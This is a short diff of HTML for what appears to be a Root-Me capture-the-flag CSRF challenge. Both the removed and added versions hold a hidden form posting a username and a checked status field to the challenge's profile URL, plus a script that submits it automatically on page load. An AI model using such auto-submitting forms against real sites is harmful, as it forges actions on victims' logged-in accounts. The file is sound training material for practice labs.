@@ -1,25 +1,6 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <title>Formulaire de Profil</title>
-</head>
-<body>
-    <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"> 
-        <div class="form-group"> 
-            <label for="username">Username:</label> 
-            <input type="text" id="username" name="username" value="tester@gmail.com" required> 
-        </div> 
-        <br>		 
-        <div class="form-group"> 
-            <label for="status">Status:</label> 
-            <input type="checkbox" id="status" name="status" checked="checked"> 
-        </div> 
-        <br>	 
-        <button type="submit">Submit</button> 
-    </form> 
-    <script> 
-        document.forms[0].submit(); 
-    </script>
-</body>
-</html>
+<form  name="csrf" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
+  <input type="text" name="username" value="test" />
+  <input type="checkbox" name="status" checked=checked />
+  <input type="submit" value="Submit request" />
+</form>
+<script>document.csrf.submit()</script>
